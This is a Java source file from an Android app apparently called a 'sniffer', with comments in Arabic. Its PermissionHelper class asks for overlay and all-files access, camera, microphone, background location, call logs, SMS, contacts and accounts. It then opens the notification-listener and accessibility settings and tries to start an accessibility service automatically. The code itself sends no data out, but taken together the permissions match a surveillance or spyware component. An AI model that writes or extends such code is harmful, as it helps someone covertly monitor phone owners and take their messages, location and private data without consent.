package com.v8.global.sniffer.utils;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import com.v8.global.sniffer.services.AccessibilityHelper;
import java.util.ArrayList;
import java.util.List;

public class PermissionHelper {

    private Activity activity;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 101;
    private static final int MANAGE_STORAGE_CODE = 102;

    public PermissionHelper(Activity activity) {
        this.activity = activity;
    }

    public void requestAllPermissions() {
        // 1. صلاحية العرض فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }

        // 2. صلاحية إدارة الملفات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // 3. باقي الصلاحيات
        requestRuntimePermissions();
    }

    private void requestRuntimePermissions() {
        String[] permissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.POST_NOTIFICATIONS
        };

        List<String> needed = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(activity, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(activity, 
                needed.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        }

        // فتح إعدادات الإشعارات والوصول
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                openNotificationSettings();
                openAccessibilitySettings();
            }
        }, 2000);
    }

    private void openNotificationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            activity.startActivity(intent);
        }
    }

    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);
        
        // تفعيل خدمة الوصول تلقائياً
        AccessibilityHelper.startAccessibilityHelper(activity);
    }

    public boolean hasAllPermissions() {
        // التحقق من الصلاحيات الأساسية
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE) 
                != PackageManager.PERMISSION_GRANTED) {
            return false;
        }
        return true;
    }
}
